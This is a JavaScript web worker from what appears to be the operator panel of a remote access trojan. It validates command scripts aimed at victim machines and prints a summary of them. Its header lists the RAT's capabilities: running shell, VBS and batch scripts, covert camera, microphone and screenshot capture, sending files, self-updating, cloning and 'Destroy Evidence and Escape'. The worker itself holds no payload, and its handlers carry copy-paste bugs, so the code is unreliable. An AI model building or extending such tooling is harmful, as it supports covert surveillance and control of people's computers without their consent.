/*
List of Built-in PC functions

Eg: PC.Lock("A01");

------------------------------------------------
Command         Ack     Description
------------------------------------------------
Excape(x)        Y      Execute Batch script and Escape()
Escape()         Y      Destroy Evidence and Escape
Marco()          Y      Returns Polo if Online
Close()          Y      End Execution
Update(x)        Y      Updates self
Hibernate(x)     Y      Hibernate till date
Revive()         Y      End Hibernation  
Notify()         Y      Notifies power schedule
Rename(x)        Y      Renames RAT
Flash()          N      Flashes Screen, Visual Indication
Vbs(x)           Y      Runs .VBS Script
Bat(x)           Y      Runs .Bat Script
Shell(x)         Y      Runs Shell Commands
Speak(x)         Y      Text to Speech
Play(x)          Y      Play a Remote (mp3) Audio File (URL)
Mic(x)           N      Records audio for 'x' ms
Lock(x)          N      Select Target
Info(x)          Y      Shows Info box
Warn(x)          Y      Shows Warning Box
Error(x)         Y      Shows Error box
Msgbox(x,y)      Y      Shows Msg Box fo 'y' ms
Google(x)        Y      Googles selected Text
Web(x)           Y      Navigates to 'x' url
Type(x)          Y      Types custom text
Screenshot(x)    Y      Takes a Screenshot
Camera(x)        Y      Captures a Photo
Details(x)          Y      Retrieves Disk Info
Tree(x)          Y      Retrieves Disk Info
Send(x)          Y      Sends a File
Zip(x)           Y      Zip a folder
Unzip(x)         Y      Unzips file
Health(x)        Y      Reports back working conditions
Log(x)           Y      Logs every Activity
Delay(x)         N      Pause Execution temporarily for 'x' ms
Shutdown(x)      N       Shutsdown the system after 'x' ms"
Clone()          Y      Initiate Clone Operations
Noclone()        Y      Stops Cloning op

And more...

*/
onmessage = function (event) {
 var txt = "Code Summary:"; //Summary txt
 // General Array Format: [Error, Err desc(txt), Err desc(markup), target|class|all, target_spcified?(0|1|2|3)]
 // arr[4]=> 0: Not specified, 1: Target, 2:Class, 3:All
 var arr = [false, "txt", "html", "target", 0];

 var PC = {
  Excape: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Excape(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Execute Batch script and Escape()";
    }
   }
  },

  Escape: () => {
   if (!arr[0]) {
    txt += "<br>- Destroy Evidence and Escape";
   }
  },

  Marco: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Marco(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Returns Polo if Online";
    }
   }
  },

  Close: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Close(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- End Execution";
    }
   }
  },

  Update: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Update(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Updates self";
    }
   }
  },

  Hibernate: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Hibernate(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Hibernate till date";
    }
   }
  },

  Revive: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Revive(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- End Hibernation  ";
    }
   }
  },

  Notify: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Notify(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Notifies power schedule";
    }
   }
  },

  Rename: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Rename(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Renames RAT";
    }
   }
  },

  Flash: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Flash(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Flashes Screen, Visual Indication";
    }
   }
  },

  Vbs: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Vbs(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs .VBS Script";
    }
   }
  },

  Bat: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Bat(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs .Bat Script";
    }
   }
  },

  Shell: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Shell(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Runs Shell Commands";
    }
   }
  },

  Speak: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Speak(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Text to Speech";
    }
   }
  },

  Play: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Audio ref Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Play(<grn>*.mp3</grn>)<br><br>Compiler failed with exit code 1F96";
    } else {
     txt += "<br>- Plays a Remote Audio file on host PC";
    }
   }
  },

  Mic: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Mic(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Records audio for 'x' ms";
    }
   }
  },

  Lock: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Target Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     if (arr[4] < 2) {
      arr[3] = x;
      arr[4] = 1;
     }
    }
   }
  },

  Class: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Class Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Class(<grn>class_name</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     if (arr[4] < 3) {
      arr[3] = x;
      arr[4] = 2;
     }
    }
   }
  },

  All: () => {
   if (!arr[0]) {
    arr[3] = "All Systems";
    arr[4] = 3;
   }
  },

  Info: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Info(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Info box";
    }
   }
  },

  Warn: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Warn(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Warning Box";
    }
   }
  },

  Error: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Error(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Error box";
    }
   }
  },

  Msgbox: (x, y) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Msgbox(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Shows Msg Box fo 'y' ms";
    }
   }
  },

  Google: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Query Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Google(<grn>query</grn>)<br><br>Compiler failed with exit code 1F69";
    } else {
     txt += "<br>- Googles the selected Query";
    }
   }
  },

  Web: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Web(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Navigates to 'x' url";
    }
   }
  },

  Type: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Type(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Types custom text";
    }
   }
  },

  Screenshot: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Screenshot(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Takes a Screenshot";
    }
   }
  },

  Camera: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Camera(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Captures a Photo";
    }
   }
  },

  Details: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Disk(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Retrieves Disk Info";
    }
   }
  },

  Tree: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Tree(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Retrieves Disk Info";
    }
   }
  },

  Send: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Send(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Sends a File";
    }
   }
  },

  Zip: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Zip(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Zip a folder";
    }
   }
  },

  Unzip: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Unzip(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Unzips file";
    }
   }
  },

  Health: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Health(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Reports back working conditions";
    }
   }
  },

  Log: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Log(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Logs every Activity";
    }
   }
  },

  Delay: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Delay(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>- Adds temporarily delay";
    }
   }
  },

  Shutdown: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Shutdown(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>-  Shutsdown the system after 'x' ms";
    }
   }
  },

  Clone: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Clone(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Initiate Clone Operations";
    }
   }
  },

  Noclone: () => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Noclone(<grn>ARG2</grn>)<br><br>Compiler failed with exit code 1FXX";
    } else {
     txt += "<br>- Stops Cloning op";
    }
   }
  },
 };

 try {
  eval(event.data);
 } catch (e) {
  arr[0] = true;
  arr[1] = e;
  arr[2] = "<red>Program Error</red><br><br>Compiler failed with exit code 1F206";
 }

 if (!arr[0] && !arr[4]) {
  arr = [true, "Target Not specified", "<red>Program Error</red><br><br>Syntax: PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F43", "target", false];
 }
 arr[0] ? postMessage(arr) : txt == "Code Summary:" ? postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>- No Actions to perform.", arr[3], arr[4]]) : postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>" + txt, arr[3], arr[4]]);
};
